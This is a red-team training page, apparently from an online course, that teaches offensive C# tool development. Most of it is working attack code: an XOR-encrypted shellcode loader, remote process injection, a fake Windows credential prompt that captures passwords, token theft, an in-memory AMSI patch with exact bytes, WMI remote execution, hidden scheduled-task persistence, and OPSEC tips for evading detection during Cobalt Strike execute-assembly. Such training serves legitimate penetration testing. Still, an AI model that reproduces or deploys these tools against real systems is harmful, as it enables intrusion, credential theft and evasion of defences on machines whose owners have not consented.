---
layout: training-page
title: "C# Offensive Tool Development — Red Team Academy"
module: "Tool Development"
tags:
  - csharp
  - dotnet
  - tool-dev
  - sharptools
  - ghostpack
  - execute-assembly
page_key: "tool-dev-csharp-offensive"
---

<h1>C# Offensive Tool Development</h1>

<p>C# is the dominant language for Windows post-exploitation tooling. The .NET framework provides native access to the Windows API, Active Directory, WMI, registry, and COM objects without the P/Invoke overhead of other languages. C# assemblies can be loaded and executed entirely in memory via Cobalt Strike's <code>execute-assembly</code>, Sliver's <code>execute-assembly</code>, or any C2 that supports .NET assembly execution — making C# the language of choice for "fileless" offensive tools. The GhostPack suite (Rubeus, Seatbelt, SharpUp, Certify, SharpDPAPI) established C# as the standard for red team tooling.</p>

<h2>Why C# for Offensive Tooling</h2>

<pre><code># Advantages:
# - Native Windows API access via P/Invoke and COM interop
# - Execute-assembly: load and run .NET assemblies in-memory from C2
# - Rich .NET class library: AD, crypto, networking, WMI, registry
# - BOF alternative: compile to .NET assembly, run via execute-assembly
# - Strong tooling ecosystem: GhostPack, SharpCollection, etc.
# - Cross-compile from Linux via dotnet CLI
# - Can target .NET Framework 4.x (preinstalled on all modern Windows)
# - Single-file output: one .exe or .dll

# Disadvantages:
# - .NET assembly loading triggers ETW events (Microsoft-Windows-DotNETRuntime)
# - AMSI inspects .NET assemblies since .NET 4.8+
# - Larger binaries than C/C++ BOFs
# - .NET runtime must be present on target (Framework 4.x is ubiquitous)
# - Strongly-typed metadata can be inspected by defenders</code></pre>

<h2>Project Setup</h2>

<pre><code># Create a .NET Framework console app (targets Framework 4.x on Windows)
# Using dotnet CLI on Linux:
dotnet new console -n SharpTool --framework net48
cd SharpTool

# Or target .NET 6/7/8 for self-contained deployment:
dotnet new console -n SharpTool --framework net8.0

# For execute-assembly compatibility, target .NET Framework 4.x
# Most C2 frameworks expect Framework assemblies, not .NET Core

# Build as single file
dotnet publish -c Release -r win-x64 --self-contained false /p:PublishSingleFile=true

# Build for execute-assembly (Framework 4.x .exe)
# Use Visual Studio or MSBuild on Windows
csc /target:exe /out:SharpTool.exe /reference:System.DirectoryServices.dll Program.cs

# Or use Mono on Linux
mcs -target:exe -out:SharpTool.exe -r:System.DirectoryServices.dll Program.cs</code></pre>

<h2>Windows API via P/Invoke</h2>

<pre><code>using System;
using System.Runtime.InteropServices;

class WinAPI
{
    // Import Windows API functions via P/Invoke
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    // Memory protection constants
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;

    static void Main(string[] args)
    {
        // XOR-encrypted shellcode (encrypt with: for b in sc: b ^ 0x41)
        byte[] encrypted = new byte[] { /* ... encrypted bytes ... */ };
        byte key = 0x41;

        // Decrypt
        byte[] shellcode = new byte[encrypted.Length];
        for (int i = 0; i &lt; encrypted.Length; i++)
            shellcode[i] = (byte)(encrypted[i] ^ key);

        // Allocate RW memory
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        // Copy shellcode
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        // Change to RX (not RWX — avoid detection)
        uint oldProtect;
        VirtualProtect(addr, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

        // Execute
        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}</code></pre>

<h2>Active Directory Enumeration</h2>

<pre><code>using System;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;

class ADEnum
{
    static void Main(string[] args)
    {
        // Get current domain
        Domain domain = Domain.GetCurrentDomain();
        Console.WriteLine($"[+] Domain: {domain.Name}");
        Console.WriteLine($"[+] Forest: {domain.Forest.Name}");

        foreach (DomainController dc in domain.DomainControllers)
            Console.WriteLine($"[+] DC: {dc.Name} ({dc.IPAddress})");

        // LDAP search for domain admins
        DirectoryEntry entry = new DirectoryEntry("LDAP://" + domain.Name);
        DirectorySearcher searcher = new DirectorySearcher(entry);

        // Find Domain Admins
        searcher.Filter = "(&amp;(objectCategory=group)(cn=Domain Admins))";
        SearchResult daGroup = searcher.FindOne();
        Console.WriteLine("\n[+] Domain Admins:");
        foreach (string member in daGroup.Properties["member"])
            Console.WriteLine($"    {member}");

        // Find all users with SPNs (Kerberoastable)
        searcher.Filter = "(&amp;(objectCategory=user)(servicePrincipalName=*))";
        Console.WriteLine("\n[+] Kerberoastable Users:");
        foreach (SearchResult user in searcher.FindAll())
        {
            string sam = user.Properties["sAMAccountName"][0].ToString();
            string spn = user.Properties["servicePrincipalName"][0].ToString();
            Console.WriteLine($"    {sam} — {spn}");
        }

        // Find computers with unconstrained delegation
        searcher.Filter = "(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))";
        Console.WriteLine("\n[+] Unconstrained Delegation:");
        foreach (SearchResult comp in searcher.FindAll())
            Console.WriteLine($"    {comp.Properties["cn"][0]}");

        // Find users with AdminCount=1 (privileged accounts)
        searcher.Filter = "(&amp;(objectCategory=user)(adminCount=1))";
        Console.WriteLine("\n[+] Privileged Users (AdminCount=1):");
        foreach (SearchResult user in searcher.FindAll())
            Console.WriteLine($"    {user.Properties["sAMAccountName"][0]}");

        // Find AS-REP roastable users (no preauth required)
        searcher.Filter = "(&amp;(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
        Console.WriteLine("\n[+] AS-REP Roastable Users:");
        foreach (SearchResult user in searcher.FindAll())
            Console.WriteLine($"    {user.Properties["sAMAccountName"][0]}");
    }
}</code></pre>

<h2>Process Injection</h2>

<pre><code>using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Injector
{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr,
        uint size, uint allocType, uint protect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr addr,
        byte[] buffer, uint size, out uint written);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr attrs,
        uint stackSize, IntPtr startAddr, IntPtr param, uint flags, out uint threadId);

    static void Main(string[] args)
    {
        // Find target process
        Process[] procs = Process.GetProcessesByName("explorer");
        if (procs.Length == 0) { Console.WriteLine("[-] Target not found"); return; }
        int targetPid = procs[0].Id;
        Console.WriteLine($"[+] Target PID: {targetPid}");

        byte[] shellcode = new byte[] { /* ... */ };

        // Open process with full access
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetPid);

        // Allocate memory in target (RW)
        IntPtr remoteAddr = VirtualAllocEx(hProcess, IntPtr.Zero,
            (uint)shellcode.Length, 0x3000, 0x04);

        // Write shellcode
        uint written;
        WriteProcessMemory(hProcess, remoteAddr, shellcode,
            (uint)shellcode.Length, out written);

        // Change to RX, then create remote thread
        // (VirtualProtectEx call omitted for brevity — see full example)
        uint threadId;
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr,
            IntPtr.Zero, 0, out threadId);

        Console.WriteLine("[+] Injected successfully");
    }
}</code></pre>

<h2>Credential Harvesting</h2>

<pre><code>using System;
using System.Runtime.InteropServices;

class CredHarvest
{
    // Prompt user for credentials (phishing dialog)
    [DllImport("credui.dll", CharSet = CharSet.Unicode)]
    static extern int CredUIPromptForWindowsCredentials(
        ref CREDUI_INFO info, int authError,
        ref uint authPackage, IntPtr inAuthBuffer, uint inAuthBufferSize,
        out IntPtr outAuthBuffer, out uint outAuthBufferSize,
        ref bool save, uint flags);

    [DllImport("credui.dll", CharSet = CharSet.Unicode)]
    static extern bool CredUnPackAuthenticationBuffer(
        uint flags, IntPtr authBuffer, uint authBufferSize,
        System.Text.StringBuilder user, ref int maxUser,
        System.Text.StringBuilder domain, ref int maxDomain,
        System.Text.StringBuilder password, ref int maxPassword);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct CREDUI_INFO
    {
        public int cbSize;
        public IntPtr hwndParent;
        public string pszMessageText;
        public string pszCaptionText;
        public IntPtr hbmBanner;
    }

    static void HarvestCredentials()
    {
        CREDUI_INFO info = new CREDUI_INFO();
        info.cbSize = Marshal.SizeOf(info);
        info.pszMessageText = "Windows Security requires your credentials to continue.";
        info.pszCaptionText = "Windows Security";

        uint authPackage = 0;
        bool save = false;
        IntPtr outBuffer;
        uint outBufferSize;

        // Show Windows credential dialog (looks completely legitimate)
        int result = CredUIPromptForWindowsCredentials(
            ref info, 0, ref authPackage,
            IntPtr.Zero, 0, out outBuffer, out outBufferSize,
            ref save, 0x1); // CREDUIWIN_GENERIC

        if (result == 0) // ERROR_SUCCESS
        {
            var user = new System.Text.StringBuilder(256);
            var domain = new System.Text.StringBuilder(256);
            var password = new System.Text.StringBuilder(256);
            int maxUser = 256, maxDomain = 256, maxPassword = 256;

            CredUnPackAuthenticationBuffer(0, outBuffer, outBufferSize,
                user, ref maxUser, domain, ref maxDomain,
                password, ref maxPassword);

            Console.WriteLine($"[+] Domain: {domain}");
            Console.WriteLine($"[+] User: {user}");
            Console.WriteLine($"[+] Password: {password}");
        }
    }
}</code></pre>

<h2>Token Manipulation</h2>

<pre><code>using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

class TokenThief
{
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr hProcess, uint access, out IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hToken, uint access,
        IntPtr attrs, int impLevel, int tokenType, out IntPtr newToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(IntPtr hToken, uint logonFlags,
        string appName, string cmdLine, uint creationFlags,
        IntPtr env, string currentDir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO { public int cb; /* ... remaining fields ... */ }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int pid, tid; }

    static void StealToken(int targetPid)
    {
        // Open target process and its token
        IntPtr hProcess = OpenProcess(0x0400, false, targetPid); // PROCESS_QUERY_INFORMATION
        IntPtr hToken;
        OpenProcessToken(hProcess, 0x0002, out hToken); // TOKEN_DUPLICATE

        // Duplicate as primary token
        IntPtr newToken;
        DuplicateTokenEx(hToken, 0x000F01FF, IntPtr.Zero, 2, 1, out newToken);
        // SecurityImpersonation=2, TokenPrimary=1

        // Launch process with stolen token
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;
        CreateProcessWithTokenW(newToken, 0, null, "cmd.exe",
            0, IntPtr.Zero, null, ref si, out pi);

        Console.WriteLine($"[+] Spawned cmd.exe with stolen token, PID: {pi.pid}");
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
}</code></pre>

<h2>AMSI Bypass (In-Memory Patching)</h2>

<pre><code>using System;
using System.Runtime.InteropServices;

class AmsiBypass
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr addr, uint size,
        uint newProtect, out uint oldProtect);

    static void PatchAmsi()
    {
        // Load amsi.dll and find AmsiScanBuffer
        IntPtr amsiDll = LoadLibrary("amsi.dll");
        IntPtr amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");

        // Patch: make AmsiScanBuffer return AMSI_RESULT_CLEAN immediately
        // x64 patch: mov eax, 0x80070057 (E_INVALIDARG) ; ret
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        // Make memory writable
        uint oldProtect;
        VirtualProtect(amsiScanBuffer, (uint)patch.Length, 0x40, out oldProtect);

        // Apply patch
        Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);

        // Restore protection
        VirtualProtect(amsiScanBuffer, (uint)patch.Length, oldProtect, out oldProtect);

        Console.WriteLine("[+] AMSI patched");
    }
}</code></pre>

<h2>WMI Lateral Movement</h2>

<pre><code>using System;
using System.Management;

class WmiExec
{
    static void RemoteExec(string target, string command,
        string username = null, string password = null)
    {
        // Connect to remote WMI
        ConnectionOptions options = new ConnectionOptions();
        if (username != null)
        {
            options.Username = username;
            options.Password = password;
        }
        options.Impersonation = ImpersonationLevel.Impersonate;
        options.EnablePrivileges = true;

        ManagementScope scope = new ManagementScope(
            $"\\\\{target}\\root\\cimv2", options);
        scope.Connect();

        Console.WriteLine($"[+] Connected to {target} via WMI");

        // Execute command via Win32_Process.Create
        ManagementClass processClass = new ManagementClass(scope,
            new ManagementPath("Win32_Process"), null);

        ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
        inParams["CommandLine"] = command;

        ManagementBaseObject result = processClass.InvokeMethod("Create", inParams, null);
        uint returnValue = (uint)result["ReturnValue"];
        uint pid = (uint)result["ProcessId"];

        if (returnValue == 0)
            Console.WriteLine($"[+] Process created: PID {pid}");
        else
            Console.WriteLine($"[-] Failed: return code {returnValue}");
    }
}</code></pre>

<h2>Registry Persistence</h2>

<pre><code>using Microsoft.Win32;
using System;

class RegistryPersist
{
    static void AddRunKey(string name, string command)
    {
        // HKCU Run key — user-level persistence, no admin required
        RegistryKey key = Registry.CurrentUser.OpenSubKey(
            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
        key.SetValue(name, command);
        key.Close();
        Console.WriteLine($"[+] Added Run key: {name}");
    }

    static void AddScheduledTask(string name, string command, int intervalMinutes)
    {
        // Create scheduled task via COM (no schtasks.exe — avoids command line logging)
        Type taskServiceType = Type.GetTypeFromProgID("Schedule.Service");
        dynamic taskService = Activator.CreateInstance(taskServiceType);
        taskService.Connect();

        dynamic folder = taskService.GetFolder("\\");
        dynamic taskDef = taskService.NewTask(0);

        taskDef.RegistrationInfo.Description = "System Maintenance";
        taskDef.Settings.Enabled = true;
        taskDef.Settings.Hidden = true;

        // Trigger: repeat every N minutes
        dynamic trigger = taskDef.Triggers.Create(1); // TimeTrigger
        trigger.Repetition.Interval = $"PT{intervalMinutes}M";
        trigger.StartBoundary = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss");

        // Action: run our command
        dynamic action = taskDef.Actions.Create(0); // ExecAction
        action.Path = "powershell.exe";
        action.Arguments = $"-w h -NoP -NonI -c \"{command}\"";

        folder.RegisterTaskDefinition(name, taskDef, 6, null, null, 3);
        Console.WriteLine($"[+] Scheduled task created: {name}");
    }
}</code></pre>

<h2>Execute-Assembly Considerations</h2>

<pre><code># execute-assembly loads a .NET assembly into the beacon process
# and runs it in a child AppDomain

# Cobalt Strike
beacon&gt; execute-assembly /path/to/SharpTool.exe arg1 arg2

# Sliver
sliver&gt; execute-assembly SharpTool.exe arg1 arg2

# Mythic (via Apollo agent)
# upload assembly, then run

# Key constraints:
# - Assembly must target .NET Framework 4.x (not .NET Core/5+)
# - Entry point must be static Main(string[] args)
# - Console.WriteLine output is captured and returned to C2
# - Assembly runs in-memory — no file on disk
# - BUT: .NET assembly loading triggers ETW events
# - AND: AMSI scans the assembly on load (.NET 4.8+)

# OPSEC: Patch AMSI before execute-assembly
# OPSEC: Patch ETW before execute-assembly
# OPSEC: Use InlineExecute-Assembly (loads in current process, no fork&amp;run)

# InlineExecute-Assembly BOF — avoids fork&amp;run detection
# github.com/anthemtotheego/InlineExecute-Assembly
beacon&gt; inlineExecute-Assembly --dotnetassembly SharpTool.exe --assemblyargs "arg1"</code></pre>

<h2>GhostPack Tools to Study</h2>

<pre><code># Essential C# offensive tools (all open-source, study the code):
#
# Rubeus — Kerberos abuse (AS-REP roast, Kerberoast, S4U, ticket manipulation)
#   github.com/GhostPack/Rubeus
#
# Seatbelt — Host enumeration and security posture assessment
#   github.com/GhostPack/Seatbelt
#
# SharpUp — Windows privilege escalation checks
#   github.com/GhostPack/SharpUp
#
# Certify — ADCS enumeration and abuse
#   github.com/GhostPack/Certify
#
# SharpDPAPI — DPAPI credential extraction
#   github.com/GhostPack/SharpDPAPI
#
# SharpWMI — WMI lateral movement and persistence
#   github.com/GhostPack/SharpWMI
#
# SharpRoast — Kerberoasting (predecessor to Rubeus)
#   github.com/GhostPack/SharpRoast
#
# SharpCollection — pre-compiled collection of Sharp tools
#   github.com/Flangvik/SharpCollection
#
# SharpHound — BloodHound data collector
#   github.com/BloodHoundAD/SharpHound
#
# SharpView — C# port of PowerView
#   github.com/tevora-threat/SharpView</code></pre>

<h2>Resources</h2>

<ul>
  <li>GhostPack — <code>github.com/GhostPack</code></li>
  <li>SharpCollection (pre-compiled) — <code>github.com/Flangvik/SharpCollection</code></li>
  <li>InlineExecute-Assembly — <code>github.com/anthemtotheego/InlineExecute-Assembly</code></li>
  <li>OffensiveCSharp — <code>github.com/matterpreter/OffensiveCSharp</code></li>
  <li>pinvoke.net — P/Invoke signatures — <code>pinvoke.net</code></li>
  <li>.NET Framework API Browser — <code>learn.microsoft.com/en-us/dotnet/api</code></li>
</ul>
